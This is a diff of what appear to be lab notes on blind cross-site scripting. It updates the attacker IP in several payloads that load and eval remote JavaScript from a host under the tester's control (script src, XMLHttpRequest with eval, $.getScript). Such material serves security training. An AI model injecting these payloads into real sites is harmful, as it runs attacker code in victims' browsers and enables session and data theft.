@@ -11,11 +11,11 @@ To know which input fields are vulnerable, we can try loading a remote `js` file
 '><script src=http://10.10.14.2></script>
 "><script src=http://10.10.14.2></script>
 
-javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.2\';document.body.appendChild(a)')
 
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.7");a.send();</script>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.2");a.send();</script>
 
-<script>$.getScript("http://10.10.14.7")</script>
+<script>$.getScript("http://10.10.14.2")</script>
 ```
 
 > [!NOTE] Note
